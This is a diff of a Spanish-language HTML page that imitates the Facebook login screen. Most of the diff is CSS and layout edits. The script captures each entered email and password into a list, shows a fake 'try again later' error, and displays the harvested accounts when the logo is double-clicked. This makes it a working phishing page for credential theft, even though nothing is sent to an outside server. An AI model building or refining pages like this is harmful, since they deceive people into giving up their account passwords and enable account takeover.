@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Iniciar sesión en Facebook</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" integrity="sha512-1ycn6IcaQQ40/MKBv2W4R/ko0v+8sF8pPGyJ+W8Ll+z13BxU3B1J8+CWvQ4vlh98MBqMhE+l/OZ+zv/w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="" integrity="sha512-1ycn6IcaQQ40/MKBv2W4R/ko0v+8sF8pPGyJ+W8Ll+z13BxU3B1J8+CWvQ4vlh98MBqMhE+l/OZ+zv/w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
     <style>
         /* Estilos aquí... */
         body {
@@ -70,7 +70,6 @@
             text-decoration: none;
             color: #1877f2;
             font-weight: bold;
-            margin: 30%
         }
         .divider {
             display: flex;
@@ -208,6 +207,13 @@
             margin-top: 5px;
             display: none;
         }
+
+        /* Solución Flexbox */
+        .forgot-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
     </style>
 </head>
 <body>
@@ -230,7 +236,11 @@
                     <div class="spinner"></div>
                 </div>
             </form>
-            <a href="#">¿Olvidaste tu cuenta?</a>
+            <br>
+            <div class="forgot-container">
+              <a href="#">¿Olvidaste tu cuenta?</a>
+              
+            </div>
             <div class="divider">
                 <hr>
                 <span>o</span>
@@ -250,13 +260,11 @@
     <script>
         // Arreglo para almacenar las cuentas y contraseñas
         let cuentas = [];
-
         // Función para validar el formulario
         function validarFormulario() {
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             let isValid = true;
-
             // Validar correo electrónico
             if (email === '' || email.indexOf('@') === -1 || email.indexOf('.') === -1) {
                 document.getElementById('email-error').textContent = 'Por favor, ingresa un correo electrónico válido.';
@@ -265,7 +273,6 @@
             } else {
                 document.getElementById('email-error').style.display = 'none';
             }
-
             // Validar contraseña
             if (password === '' || password.length < 8) {
                 document.getElementById('password-error').textContent = 'La contraseña debe tener al menos 8 caracteres.';
@@ -274,19 +281,15 @@
             } else {
                 document.getElementById('password-error').style.display = 'none';
             }
-
             return isValid;
         }
-
         // Función para simular el envío de datos
         function enviarDatos() {
             if (validarFormulario()) {
                 const email = document.getElementById('email').value;
                 const password = document.getElementById('password').value;
-
                 // Mostrar la imagen de "Cargando..."
                 document.querySelector('.cargando').style.display = 'block';
-
                 // Simular la espera
                 setTimeout(() => {
                     // Guardar la cuenta y contraseña
@@ -295,31 +298,24 @@
                         contraseña: password,
                         fecha: new Date()
                     });
-
                     // Ocultar la imagen de "Cargando..."
                     document.querySelector('.cargando').style.display = 'none';
-
                     // Mostrar mensaje discreto
                     alert("Vuelve a intentarlo más tarde");
-
                     // Limpiar los campos del formulario
                     document.getElementById('email').value = '';
                     document.getElementById('password').value = '';
-
                     // Actualizar la lista de cuentas
                     actualizarListaCuentas();
                 }, 2000); // 2 segundos
             }
         }
-
         // Función para actualizar la lista de cuentas
         function actualizarListaCuentas() {
             const cuentasLista = document.getElementById('cuentas-lista');
             cuentasLista.innerHTML = '';
-
             // Ordenar las cuentas por fecha
             cuentas.sort((a, b) => new Date(b.fecha) - new Date(a.fecha));
-
             // Agregar cada cuenta a la lista
             cuentas.forEach((cuenta, index) => {
                 const li = document.createElement('li');
@@ -332,7 +328,6 @@
                 `;
                 cuentasLista.appendChild(li);
             });
-
             // Agregar evento de click a los tachitos
             const eliminarBtns = document.querySelectorAll('.eliminar');
             eliminarBtns.forEach((btn, index) => {
@@ -344,7 +339,6 @@
                 });
             });
         }
-
         // Función para limpiar la lista de cuentas
         function limpiarListaCuentas() {
             if (confirm('¿Estás seguro de que quieres borrar TODAS las cuentas de la lista? Esta acción no se puede deshacer.')) {
@@ -352,14 +346,12 @@
                 actualizarListaCuentas(); // Actualizar la lista
             }
         }
-
         // Agregar evento de envío al formulario
         const formulario = document.getElementById('formulario');
         formulario.addEventListener('submit', (event) => {
             event.preventDefault();
             enviarDatos();
         });
-
         // Función para mostrar/ocultar la contraseña
         const togglePassword = document.getElementById('toggle-password');
         const passwordInput = document.getElementById('password');
@@ -374,7 +366,6 @@
                 togglePassword.classList.add('far fa-eye');
             }
         });
-
         // Agregar evento de doble clic al logo de Facebook
         const logoFb = document.getElementById('logo-fb');
         logoFb.addEventListener('dblclick', () => {
@@ -383,7 +374,6 @@
             actualizarListaCuentas();
             infoContainer.style.display = 'block';
         });
-
         // Cerrar la ventana de información con un click fuera de ella
         document.addEventListener('click', (event) => {
             const infoContainer = document.getElementById('info-container');
@@ -391,7 +381,6 @@
                 infoContainer.style.display = 'none';
             }
         });
-
         // Agregar evento de click al botón "Limpiar Lista"
         const limpiarListaBtn = document.getElementById('limpiar-lista-btn');
         limpiarListaBtn.addEventListener('click', limpiarListaCuentas);
